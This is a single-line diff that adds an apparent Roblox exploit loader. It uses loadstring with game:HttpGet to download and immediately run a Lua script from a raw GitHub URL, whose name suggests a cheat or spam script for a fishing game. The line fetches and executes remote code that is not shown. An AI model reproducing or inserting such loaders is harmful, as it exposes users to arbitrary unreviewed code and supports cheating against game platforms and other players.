@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/harpoon-a-fish-spam5-jl7w6hh2guba9q.lua"))()
